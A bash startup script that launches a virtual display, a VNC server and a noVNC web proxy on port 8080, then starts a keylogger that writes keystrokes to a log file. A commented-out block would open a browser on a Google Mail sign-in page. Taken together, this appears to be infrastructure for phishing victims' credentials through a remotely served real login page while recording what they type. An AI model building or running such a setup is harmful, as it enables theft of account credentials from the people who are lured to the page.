#!/bin/bash

# Define log files for each command
LOG_DIR="/LOGS"
LOG_XVFB="$LOG_DIR/xvfb.log"
LOG_X11VNC="$LOG_DIR/x11vnc.log"
LOG_FLUXBOX="$LOG_DIR/fluxbox.log"
LOG_NOVNC="$LOG_DIR/novnc.log"
#LOG_WEB="$LOG_DIR/web.log"
LOG_KEYLOGGER="$LOG_DIR/keystrokes.log"


# Create the LOGS directory if it doesn't exist
mkdir -p $LOG_DIR

# Start Xvfb
echo "Starting Xvfb..." > $LOG_XVFB
Xvfb :10 -screen 0 1920x1080x24 >> $LOG_XVFB 2>&1 & #1280x720x24 

# Start x11vnc
echo "Starting x11vnc..." > $LOG_X11VNC
x11vnc -display :10 -forever -shared -rfbport 5910 >> $LOG_X11VNC 2>&1 &

# Start fluxbox
echo "Starting fluxbox..." > $LOG_FLUXBOX
fluxbox >> $LOG_FLUXBOX 2>&1 &

# Start noVNC
echo "Starting noVNC..." > $LOG_NOVNC
chmod +x /opt/novnc/utils/novnc_proxy
chmod +x /opt/novnc/utils/websockify/run
/opt/novnc/utils/novnc_proxy --vnc localhost:5910 --listen 8080 >> $LOG_NOVNC 2>&1 &

# Start Chromium
# url="https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ifkv=AcMMx-ehYPnPa5DxM3jGsKQ03PncZA6X66-lI2cZryB1g24g4ncszLaHIM5PA_3MacGpk-xeeDPd&rip=1&sacu=1&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S-81572133%3A1733766030063479&ddm=1"
# echo "Starting WebEngine..." > $LOG_WEB
# /opt/web $url & >> $LOG_WEB

# Start the keylogger
# echo "Starting keylogger...\n" > $LOG_KEYLOGGER
/opt/keylogger $LOG_KEYLOGGER &

